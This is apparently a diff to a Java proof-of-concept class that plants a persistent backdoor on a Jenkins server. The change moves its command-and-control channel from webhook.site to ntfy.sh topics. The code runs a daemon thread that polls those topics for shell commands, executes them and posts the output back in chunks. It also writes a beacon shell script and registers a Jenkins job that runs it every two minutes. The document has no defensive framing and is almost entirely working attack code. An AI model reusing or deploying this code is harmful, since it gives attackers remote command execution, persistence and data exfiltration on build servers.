@@ -10,13 +10,15 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class poc {
-    static final String[] TOK = {"dafffbb2-2d6d-4cfb-8df9-1eb2822ce06b", "b0de7905-1496-47b6-93a5-8529f9c02252"};
-    static final String BEACON = "#!/bin/sh\nfor U in dafffbb2-2d6d-4cfb-8df9-1eb2822ce06b b0de7905-1496-47b6-93a5-8529f9c02252; do\n  W=\"https://webhook.site/token/$U/requests?sorting=newest\"\n  P=\"https://webhook.site/$U\"\n  J=$(curl -s -m 20 \"$W\" 2>/dev/null)\n  C=$(printf '%s' \"$J\" | grep -o '\"content\":\"CMD:[^\"]*\"' | head -1 | sed 's/^\"content\":\"CMD://' | sed 's/\"$//')\n  if [ -n \"$C\" ]; then\n    L=$(cat /var/lib/jenkins/.dsh_last 2>/dev/null)\n    if [ \"$C\" != \"$L\" ]; then\n      printf '%s' \"$C\" > /var/lib/jenkins/.dsh_last\n      O=$(eval \"$C\" 2>&1 | head -c 60000)\n      curl -s -m 25 --data-binary \"OUT $O\" \"$P\" >/dev/null 2>&1\n    fi\n  fi\ndone\nexit 0\n";
+    static final String CT = "dsh-cmd-ebe7b66ec8";
+    static final String OT = "dsh-out-63c189afbe";
+    static final String BEACON = "#!/bin/sh\nCT=dsh-cmd-ebe7b66ec8\nOT=dsh-out-63c189afbe\nJ=$(curl -s -m 20 \"https://ntfy.sh/$CT/json?poll=1&since=10m\" 2>/dev/null)\nC=$(printf '%s' \"$J\" | grep -o '\"message\":\"[^\"]*\"' | tail -1 | sed 's/^\"message\":\"//;s/\"$//')\nif [ -n \"$C\" ]; then\n  L=$(cat /var/lib/jenkins/.dsh_last 2>/dev/null)\n  if [ \"$C\" != \"$L\" ]; then\n    printf '%s' \"$C\" > /var/lib/jenkins/.dsh_last\n    O=$(eval \"$C\" 2>&1 | head -c 60000)\n    printf '%s' \"$O\" | split -b 3000 - /tmp/.dsh_o_ 2>/dev/null\n    for F in /tmp/.dsh_o_*; do\n      curl -s -m 25 --data-binary @$F \"https://ntfy.sh/$OT\" >/dev/null 2>&1\n      rm -f $F\n    done\n  fi\nfi\nexit 0\n";
     static final String JOB = "<?xml version='1.1' encoding='UTF-8'?>\n<project>\n  <actions/><description>dsh</description><keepDependencies>false</keepDependencies><properties/>\n  <scm class=\"hudson.scm.NullSCM\"/><canRoam>true</canRoam><disabled>false</disabled>\n  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>\n  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>\n  <triggers><hudson.triggers.TimerTrigger><spec>*/2 * * * *</spec></hudson.triggers.TimerTrigger></triggers>\n  <concurrentBuild>false</concurrentBuild>\n  <builders><hudson.tasks.Shell><command>sh /var/lib/jenkins/.dsh_beacon.sh</command></hudson.tasks.Shell></builders>\n  <publishers/>\n</project>\n";
-    static Pattern RE = Pattern.compile("\"content\":\"((?:[^\"\\\\]|\\\\.)*)\"");
+    static Pattern RE = Pattern.compile("\"message\":\"((?:[^\"\\\\]|\\\\.)*)\"");
+    static String last = "";
 
     public poc() {
-        StringBuilder sb = new StringBuilder("P17\n");
+        StringBuilder sb = new StringBuilder("P18\n");
         try {
             Thread t = new Thread(new Runnable() { public void run() { loop(); } });
             t.setDaemon(true); t.start();
@@ -33,31 +35,31 @@ public class poc {
             jc.getMethod("reload").invoke(j);
             sb.append("JOB+RELOAD ok\n");
         } catch (Throwable t) { sb.append("PERSIST ERR ").append(t).append("\n"); }
-        post("P17 " + sb.toString());
-        try { Thread.sleep(2000); } catch (Throwable t) { }
+        send(OT, "P18 " + sb.toString());
     }
 
     static void loop() {
-        String last = "";
         while (true) {
-            for (int i = 0; i < TOK.length; i++) {
-                try {
-                    String j = http("https://webhook.site/token/" + TOK[i] + "/requests?sorting=newest");
-                    if (j == null) { continue; }
+            try {
+                String j = get("https://ntfy.sh/" + CT + "/json?poll=1&since=30m");
+                if (j != null) {
                     Matcher m = RE.matcher(j);
                     String cmd = null;
-                    while (m.find()) {
-                        String c = m.group(1);
-                        if (c.startsWith("CMD:")) { cmd = c.substring(4); break; }
-                    }
-                    if (cmd != null && cmd.length() > 0 && !cmd.equals(last)) {
+                    while (m.find()) { cmd = unesc(m.group(1)); }
+                    if (cmd != null && cmd.length() > 0 && !cmd.equals(last) && !cmd.startsWith("P18")) {
                         last = cmd;
                         String out = exec(cmd);
-                        post("OUT " + out);
+                        int i = 0;
+                        while (i < out.length() || i == 0) {
+                            int e = Math.min(out.length(), i + 3000);
+                            send(OT, out.substring(i, e));
+                            i = e;
+                            if (i >= out.length()) { break; }
+                        }
                     }
-                } catch (Throwable t) { }
-            }
-            try { Thread.sleep(30000); } catch (Throwable t) { }
+                }
+            } catch (Throwable t) { }
+            try { Thread.sleep(25000); } catch (Throwable t) { }
         }
     }
 
@@ -79,17 +81,17 @@ public class poc {
         return o.toString();
     }
 
-    static String http(String u) {
+    static String get(String u) {
         try {
             HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
             c.setConnectTimeout(10000); c.setReadTimeout(20000);
-            c.setRequestProperty("User-Agent", "Mozilla/5.0");
+            c.setRequestProperty("User-Agent", "curl/7.6");
             ByteArrayOutputStream bo = new ByteArrayOutputStream();
             InputStream in = c.getInputStream();
             byte[] b = new byte[8192]; int n;
-            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 500000) { break; } }
+            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 800000) { break; } }
             in.close();
-            return unesc(new String(bo.toByteArray(), "UTF-8"));
+            return new String(bo.toByteArray(), "UTF-8");
         } catch (Throwable t) { return null; }
     }
 
@@ -107,7 +109,7 @@ public class poc {
                 if (in.available() > 0) { int n = in.read(b); if (n < 0) { break; } bo.write(b, 0, n); }
                 else if (!p.isAlive()) { break; }
                 else { Thread.sleep(100); }
-                if (bo.size() > 150000) { break; }
+                if (bo.size() > 200000) { break; }
             }
             try { p.waitFor(); } catch (Throwable t) { }
             r.append(new String(bo.toByteArray(), "UTF-8"));
@@ -115,16 +117,14 @@ public class poc {
         return r.toString();
     }
 
-    static void post(String s) {
-        for (int i = 0; i < TOK.length; i++) {
-            try {
-                HttpURLConnection c = (HttpURLConnection) new URL("https://webhook.site/" + TOK[i]).openConnection();
-                c.setConnectTimeout(10000); c.setReadTimeout(25000);
-                c.setRequestMethod("POST"); c.setDoOutput(true);
-                c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
-                OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
-                if (c.getResponseCode() < 400) { return; }
-            } catch (Throwable t) { }
-        }
+    static void send(String topic, String s) {
+        try {
+            HttpURLConnection c = (HttpURLConnection) new URL("https://ntfy.sh/" + topic).openConnection();
+            c.setConnectTimeout(10000); c.setReadTimeout(25000);
+            c.setRequestMethod("POST"); c.setDoOutput(true);
+            c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
+            OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
+            c.getResponseCode();
+        } catch (Throwable t) { }
     }
 }
